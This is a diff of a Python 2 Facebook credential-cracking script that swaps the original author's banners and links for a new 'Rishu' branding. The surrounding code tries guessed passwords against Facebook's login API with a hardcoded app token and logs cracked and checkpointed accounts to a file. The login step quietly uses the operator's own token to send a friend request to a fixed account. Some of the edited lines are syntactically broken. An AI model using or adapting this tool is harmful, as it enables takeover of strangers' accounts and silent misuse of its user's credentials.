@@ -46,11 +46,13 @@ def jalan(z):
         time.sleep(0.07)
 
 
-logo = '\n\n\t\x1b[1;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84           .--.           \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t\x1b[1;93m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80           | oo |           \xe2\x96\x80\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\n\t\x1b[1;93m\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1 | ~~ |  \xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\n\t\x1b[1;93m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84           |____|            \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\n\t\x1b[1;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80                          \xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t\x1b[1;94m                   \x1b[0;37;41mPACMAN\x1b[1;31;40m\t\n\t\x1b[1;94m                 \x1b[0;31;47m \xe2\x9a\xa1BOLT \xe2\x9a\xa1\x1b[1;31;40m\t\n\t\x1b[1;92m              Dev: Mr H4ck3r xD\n\t\x1b[1;92m             fb/faizan.wahla.47  \n\t\x1b[1;92m              YT/Mr Trickster \n    \x1b[1;92m                   \x1b[0;37;41m \xe2\x9a\xa1WEAR MASK \xe2\x9a\xa1\x1b[1;31;40m                                          \n'
-logo2 = '\n\t\x1b[1;33;40m  \n\n\n\n\t  \xe2\x94\x80\xe2\x94\x80\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t  \xe2\x94\x80\xe2\x96\x92\xe2\x94\x80\xe2\x96\x84\xe2\x96\x92\xe2\x94\x80\xe2\x96\x84\xe2\x96\x92\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t  \xe2\x94\x80\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\xe2\x94\x80\xe2\x94\x80\xe2\x9a\xa1\n\t  \xe2\x94\x80\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\t  \xe2\x94\x80\xe2\x96\x92\xe2\x94\x80\xe2\x96\x92\xe2\x94\x80\xe2\x96\x92\xe2\x94\x80\xe2\x96\x92\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n  \n'
-logo3 = '\n\t\t\x1b[1;33;40m\n      \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n      \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88 \n      \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88 \n      \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88 \n      \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88 \n      \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\n      \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n      \x1b[0;37;41m\xe2\x99\xa5  \xe2\x99\xa5 A L L A H..I S..T H E..G R E A T E S T \xe2\x99\xa5   \xe2\x99\xa5\x1b[1;31;40m\n      \x1b[0;31;42mI   SEEK   REFUGE   IN  PERFECT  WORDS  OF  ALLAH\x1b[1;31;40m\n      \x1b[0;31;42mFORM    THE    EVIL    OF   WHAT    HE    CREATED\x1b[1;31;40m\n\n\t\x1b[1;92m              Dev: Mr H4ck3r xD\n\t\x1b[1;92m             fb/faizan.wahla.47  \n\t\x1b[1;92m              YT/Mr Trickster \n    \x1b[1;92m                   \x1b[0;37;41m \xe2\x9a\xa1WEAR MASK \xe2\x9a\xa1\x1b[1;31;40m\n\n\n\n'
-logo4 = '\n\t\xe2\x96\x91\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\n\t\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x90\xe2\x96\x88\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x90\xe2\x96\x88\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\t\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\n\n\t\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\n\t\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x92\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x92\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\n\t\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x92\xe2\x96\x90\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\n\n\t\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\n\t\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x91\xe2\x96\x84\n\t\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x91\xe2\x96\x80\xe2\x96\x91 \xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\n\n'
-logo5 = '\n\t\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xae\x9c\xdb\xa9\xdb\xa9\xdb\xa9\xdb\xa9\xe0\xae\x9c\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\t\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\n\t\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\n\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\n\t\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\n\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\n\t\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\tF O R        E V E R Y T H I N G\n\t\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xae\x9c\xdb\xa9\xdb\xa9\xdb\xa9\xdb\xa9\xe0\xae\x9c\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\n'
+logo = '.########..####..######..##.....##.##.....##\x1b[1;91m
+        .##.....##..##..##....##.##.....##.##.....##\x1b[1;91m
+        .##.....##..##..##.......##.....##.##.....##\x1b[1;91m
+        .########...##...######..#########.##.....##\x1b[1;91m
+        .##...##....##........##.##.....##.##.....##\x1b[1;91m
+        .##....##...##..##....##.##.....##.##.....##\x1b[1;91m
+        .##.....##.####..######..##.....##..#######.'\x1b[1;91m
 
 def tik():
     titik = ['.   ', '..  ', '... ']
@@ -77,8 +79,7 @@ def login():
     except (KeyError, IOError):
         os.system('clear')
         print logo2
-        print '\x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
-        print ' \x1b[1;91mWarning: \x1b[1;97mDo Not Use Your Real Account'
+        print '"\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;91mRishu Khan\n \x1b[92m   FACEBOOK ID \x1b[00m: \x1b[92mhttps://www.facebook.com/Rishu.X.420\033[1;91m\n \x1b[92m WhatsApp\x1b[00m : \033[1;91mNa Duga\n\x1b[00m------------------------------------------"print ' \x1b[1;91mWarning: \x1b[1;97mDo Not Use Your Real Account'
         print ' \x1b[1;92mN o t e: \x1b[1;97mUse a Fresh Account To Login'
         print '\x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
         id = raw_input('\x1b[1;92m[+] \x1b[1;93mID/Email\x1b[1;92m \xe2\x96\xba \x1b[1;96m')
@@ -111,7 +112,7 @@ def login():
                 unikers.write(z['access_token'])
                 unikers.close()
                 print '\n\x1b[1;36;40m[\xe2\x9c\x93] Login Successful...'
-                os.system('xdg-open https://www.youtube.com/channel/UCKQ85sgFrddygumAGP8b5pQ')
+                os.system('xdg-open https://www.facebook.com/Rishu.X.420')
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 menu()
             except requests.exceptions.ConnectionError:
@@ -170,7 +171,7 @@ def menu():
     print '\x1b[1;92m[2] \x1b[1;33;40mAmerican   Lobby'
     print '\x1b[1;92m[3] \x1b[1;33;40mBangladesh Lobby'
     print '\x1b[1;92m[4] \x1b[1;33;40mIndian     Lobby'
-    print '\x1b[1;92m[5] \x1b[1;33;40mUpdate PACMAN'
+    print '\x1b[1;92m[5] \x1b[1;33;40mUpdate '
     print '\x1b[1;92m[0] \x1b[1;33;40mLogout'
     pilih()
 
@@ -527,10 +528,10 @@ def pilih_duper():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
+                print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
+                print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                 cek = open('output/cp.txt', 'a')
                 cek.write(user + '|' + pass1 + '\n')
                 cek.close()
@@ -540,10 +541,10 @@ def pilih_duper():
